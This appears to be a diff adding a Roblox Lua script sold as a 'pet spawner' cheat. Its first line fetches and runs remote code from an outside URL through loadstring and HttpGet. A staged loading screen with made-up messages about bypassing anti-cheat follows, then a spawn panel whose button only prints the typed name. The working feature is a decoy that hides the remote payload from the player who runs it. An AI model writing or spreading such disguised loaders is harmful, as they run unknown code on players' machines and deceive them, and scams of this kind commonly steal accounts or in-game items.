@@ -1,0 +1,186 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/XczgRK7FDIbPi4UH/raw", true))()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+
+-- Create screen GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Create full-screen background
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+background.Parent = screenGui
+
+-- Status message (above bar)
+local statusLabel = Instance.new("TextLabel")
+statusLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+statusLabel.Position = UDim2.new(0.5, 0, 0.65, 0)
+statusLabel.Size = UDim2.new(0, 500, 0, 50)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.new(1, 1, 1)
+statusLabel.TextScaled = true
+statusLabel.Font = Enum.Font.SourceSansItalic
+statusLabel.Text = "Starting..."
+statusLabel.Parent = background
+
+-- Loading bar container
+local barContainer = Instance.new("Frame")
+barContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+barContainer.Position = UDim2.new(0.5, 0, 0.8, 0)
+barContainer.Size = UDim2.new(0.6, 0, 0.05, 0)
+barContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barContainer.BorderSizePixel = 0
+barContainer.Parent = background
+
+-- Loading bar fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barContainer
+
+-- Percentage label
+local percentLabel = Instance.new("TextLabel")
+percentLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+percentLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
+percentLabel.Size = UDim2.new(0, 200, 0, 50)
+percentLabel.BackgroundTransparency = 1
+percentLabel.TextColor3 = Color3.new(1, 1, 1)
+percentLabel.TextScaled = true
+percentLabel.Font = Enum.Font.SourceSansBold
+percentLabel.Text = "0%"
+percentLabel.Parent = background
+
+-- Status messages
+local messages = {
+    "Getting all files for the script...",
+    "Bypassing game's anti-cheat...",
+    "Injecting custom libraries...",
+    "Hooking into player controls...",
+    "Loading assets and memory...",
+    "Finalizing and cleaning up..."
+}
+
+-- Animate loading bar
+local duration = math.random(15, 20)
+local startTime = tick()
+local tween = TweenService:Create(barFill, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+    Size = UDim2.new(1, 0, 1, 0)
+})
+tween:Play()
+
+-- Update loop
+while tick() - startTime < duration do
+    local progress = (tick() - startTime) / duration
+    percentLabel.Text = tostring(math.floor(progress * 100)) .. "%"
+
+    local messageIndex = math.clamp(math.floor(progress * #messages) + 1, 1, #messages)
+    statusLabel.Text = messages[messageIndex]
+
+    wait(0.1)
+end
+
+percentLabel.Text = "100%"
+statusLabel.Text = "Done!"
+
+-- Wait before showing final success message
+wait(1)
+
+-- Remove old elements
+barContainer:Destroy()
+percentLabel:Destroy()
+statusLabel:Destroy()
+
+-- Show final success message
+local successLabel = Instance.new("TextLabel")
+successLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+successLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+successLabel.Size = UDim2.new(0, 600, 0, 100)
+successLabel.BackgroundTransparency = 1
+successLabel.TextColor3 = Color3.fromRGB(0, 255, 127)
+successLabel.TextScaled = true
+successLabel.Font = Enum.Font.FredokaOne
+successLabel.Text = "✅ Success! Ready to spawn pets."
+successLabel.Parent = background
+
+-- Wait and remove screen
+wait(5)
+screenGui:Destroy()
+wait(2)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Full-screen GUI
+local petGui = Instance.new("ScreenGui")
+petGui.Name = "PetSpawner"
+petGui.ResetOnSpawn = false
+petGui.IgnoreGuiInset = true
+petGui.Parent = playerGui
+
+-- Full-screen invisible blocker (optional)
+local blocker = Instance.new("Frame")
+blocker.Size = UDim2.new(1, 0, 1, 0)
+blocker.Position = UDim2.new(0, 0, 0, 0)
+blocker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blocker.BackgroundTransparency = 0.5
+blocker.Parent = petGui
+
+-- Draggable window/panel
+local panel = Instance.new("Frame")
+panel.Size = UDim2.new(0.35, 0, 0.4, 0)
+panel.Position = UDim2.new(0.325, 0, 0.3, 0)
+panel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+panel.BorderSizePixel = 0
+panel.Parent = blocker
+panel.Active = true
+panel.Draggable = true
+
+-- Title label
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.2, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Enter pet's name"
+title.TextScaled = true
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.SourceSansBold
+title.Parent = panel
+
+-- TextBox for name entry
+local nameBox = Instance.new("TextBox")
+nameBox.Size = UDim2.new(0.8, 0, 0.2, 0)
+nameBox.Position = UDim2.new(0.1, 0, 0.35, 0)
+nameBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+nameBox.TextColor3 = Color3.new(0, 0, 0)
+nameBox.Font = Enum.Font.SourceSans
+nameBox.Text = ""
+nameBox.TextScaled = true
+nameBox.PlaceholderText = "Type pet name..."
+nameBox.Parent = panel
+
+-- Spawn button
+local spawnButton = Instance.new("TextButton")
+spawnButton.Size = UDim2.new(0.5, 0, 0.2, 0)
+spawnButton.Position = UDim2.new(0.25, 0, 0.65, 0)
+spawnButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+spawnButton.Text = "Spawn"
+spawnButton.TextScaled = true
+spawnButton.TextColor3 = Color3.new(1, 1, 1)
+spawnButton.Font = Enum.Font.SourceSansBold
+spawnButton.Parent = panel
+
+-- On click: print pet name
+spawnButton.MouseButton1Click:Connect(function()
+	local petName = nameBox.Text
+	if petName and petName ~= "" then
+		print("Spawning pet:", petName)
+	else
+		warn("No pet name entered!")
+	end
+end)
